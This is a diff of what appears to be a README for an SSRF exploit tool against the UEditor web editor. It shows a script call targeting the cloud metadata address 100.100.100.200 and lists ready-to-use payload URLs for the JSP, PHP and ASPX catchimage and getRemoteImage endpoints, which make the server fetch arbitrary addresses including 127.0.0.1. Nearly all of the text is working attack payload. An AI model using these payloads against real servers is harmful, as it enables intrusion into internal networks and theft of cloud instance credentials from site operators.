@@ -6,10 +6,9 @@ python u_ssrf.py http://100.100.100.200/latest/meta-data/
 <img width="1209" height="579" alt="image" src="https://github.com/user-attachments/assets/cd4ce304-4a83-4d79-bc70-75294bb520e5" />
 
 JSP：
-action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
-/jsp/controller.jsp?action=catchimage&source[]=
-/jsp/getRemoteImage.jsp?upfile=
-action=catchimage&source[]= https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
+
+/jsp/controller.jsp?action=catchimage&source[]=https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png
+/jsp/getRemoteImage.jsp?upfile=action=catchimage&source[]= https://www.baidu.com/img/?.png
 /ueditor/jsp/getRemoteImage.jsp?upfile=http://127.0.0.1/favicon.ico?.jpg
 
 PHP：
@@ -17,8 +16,7 @@ PHP：
 /php/controller.php?action=catchimage&source[]=
 
 ASPX
-/ueditor/net/controller.ashx?action=catchimage
-source%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx
+/ueditor/net/controller.ashx?action=catchimage&source%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx
 
 Upload Path：
 /ueditor/index.html
